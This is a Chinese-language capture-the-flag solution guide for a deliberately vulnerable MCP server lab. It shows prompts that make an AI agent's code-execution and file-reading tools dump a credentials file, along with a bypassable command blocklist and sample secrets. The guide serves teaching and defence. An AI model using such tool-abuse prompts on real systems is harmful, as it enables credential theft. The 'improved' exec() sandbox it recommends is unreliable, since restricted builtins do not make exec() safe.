# 挑战 8：恶意代码执行 - 解决方案指南

## 漏洞概述

本挑战展示了 MCP 服务器中的恶意代码执行漏洞。MCP 服务器在没有适当验证或沙箱化的情况下执行代码，允许攻击者在系统上运行任意代码。

## 解决方案

### 步骤 1：信息收集

首先，探索服务器以了解可用的资源和工具：

1. 连接到 http://localhost:9008 的 MCP 服务器
2. 检查可用的资源和工具
3. 注意有系统信息资源 (`system://info`) 和用于执行 Python 代码 (`execute_python_code`)、执行 shell 命令 (`execute_shell_command`) 和分析日志文件 (`analyze_log_file`) 的工具

### 步骤 2：识别漏洞

漏洞存在于多个在没有适当验证或沙箱化的情况下执行代码的工具中：

**1. `execute_python_code` 工具执行任意 Python 代码：**

```python
# 漏洞：此工具在没有适当沙箱化的情况下执行任意 Python 代码
result = subprocess.check_output([sys.executable, temp_file_path], stderr=subprocess.STDOUT)
```

**2. `execute_shell_command` 工具执行任意 shell 命令：**

```python
# 漏洞：此工具在没有适当验证的情况下执行任意 shell 命令
# 尝试安全性（但不充分）：阻止一些危险命令
dangerous_commands = ["rm", "mkfs", "dd", "format", ">", ">>"]
# 这个过滤器很容易被绕过
```

**3. `analyze_log_file` 工具可以读取系统上的任何文件**

### 步骤 3：利用漏洞

有多种方法可以利用此漏洞：

**方法 1：执行恶意 Python 代码**

使用 `execute_python_code` 工具运行访问敏感信息的代码：

```
请使用 execute_python_code 工具执行以下 Python 代码：

import os

# 读取敏感凭据文件
with open('/tmp/dvmcp_challenge8/sensitive/credentials.txt', 'r') as f:
    credentials = f.read()

print("敏感凭据:")
print(credentials)
```

**方法 2：执行 shell 命令访问敏感信息**

使用 `execute_shell_command` 工具运行访问敏感信息的命令：

```
请使用 execute_shell_command 工具执行命令 "cat /tmp/dvmcp_challenge8/sensitive/credentials.txt"
```

**方法 3：绕过危险命令过滤器**

危险命令过滤器不充分，可以被绕过：

```
请使用 execute_shell_command 工具执行命令 "cat /tmp/dvmcp_challenge8/sensitive/credentials.txt | grep -A 10 PRODUCTION"
```

**方法 4：使用 analyze_log_file 工具**

使用 `analyze_log_file` 工具读取敏感文件：

```
请使用 analyze_log_file 工具分析 "/tmp/dvmcp_challenge8/sensitive/credentials.txt" 文件
```

### 步骤 4：获取敏感信息

使用上述任何方法，你可以访问敏感凭据：

```
生产环境凭据
----------------------
数据库:
  主机: db.acmecorp.internal
  用户名: db_admin
  密码: Pr0d-DB-S3cur3!P@$$w0rd

AWS:
  访问密钥 ID: AKIAIOSFODNN7EXAMPLE
  秘密访问密钥: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
  区域: us-west-2

API 网关:
  密钥: apg-prod-8a7b6c5d4e3f2g1h
  秘密: 9i8u7y6t5r4e3w2q1z0x9c8v7b6n5m4k3j2h1g
```

## 缓解策略

防止恶意代码执行漏洞的方法：

1. **实施适当的沙箱化**：使用安全的沙箱技术隔离代码执行
2. **使用白名单而不是黑名单**：定义特定的允许命令或操作集，而不是尝试阻止危险的命令
3. **限制系统资源访问**：限制对文件系统、网络和其他系统资源的访问
4. **实施输入验证**：验证所有输入以确保它们符合预期格式且不包含恶意代码
5. **使用最小权限原则**：只授予预期功能所需的最低权限

```python
# 改进的实现
def execute_python_code(code: str) -> str:
    """执行 Python 代码进行数据分析"""
    try:
        # 创建安全的沙箱环境
        sandbox = {
            '__builtins__': {
                'print': print,
                'len': len,
                'str': str,
                'int': int,
                'float': float,
                # 只添加安全的内置函数
            }
        }
        
        # 在沙箱中执行代码
        exec(code, sandbox)
        
        return "代码执行成功"
    except Exception as e:
        return f"执行代码时出错: {str(e)}"
```
